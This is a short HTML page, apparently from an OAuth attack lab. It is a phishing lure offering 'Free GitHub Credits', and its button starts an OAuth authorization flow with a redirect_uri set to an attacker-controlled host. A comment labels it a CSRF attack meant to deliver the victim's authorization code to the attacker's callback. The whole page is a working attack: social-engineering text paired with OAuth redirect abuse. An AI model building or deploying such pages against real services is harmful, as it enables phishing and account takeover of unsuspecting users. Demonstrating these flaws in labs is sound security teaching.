<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Free GitHub Credits! 🎉</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: "Segoe UI", sans-serif;
            background: #0f1117;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: #1a1d27;
            border: 1px solid #2a2d3a;
            border-radius: 16px;
            padding: 48px 40px;
            width: 420px;
            text-align: center;
        }
        .logo { font-size: 3rem; margin-bottom: 16px; }
        h1 { font-size: 1.4rem; color: #fff; margin-bottom: 10px; }
        p { font-size: 0.85rem; color: #666; margin-bottom: 24px; line-height: 1.6; }
        .highlight { color: #4a9eff; font-weight: 600; }
        .btn {
            display: inline-block;
            background: #238636;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 13px 28px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s;
        }
        .btn:hover { background: #2ea043; }
        .fine-print { font-size: 0.7rem; color: #333; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎁</div>
        <h1>You've been selected!</h1>
        <p>
            Claim your <span class="highlight">$50 GitHub Credits</span> by
            connecting your MyApp account. Takes 2 seconds!
        </p>
        <!-- 💀 CSRF: attacker-initiated OAuth flow, code will land on attacker's callback -->
        <a class="btn" href="http://oauthserver:3001/oauth/authorize?client_id=Ov23limMyilLzcUKBbvc&redirect_uri=http://oauthclientattacker:3003&response_mode=query">
            🎉 Claim Free Credits
        </a>
        <div class="fine-print">By clicking you agree to our terms and conditions.</div>
    </div>
</body>
</html>
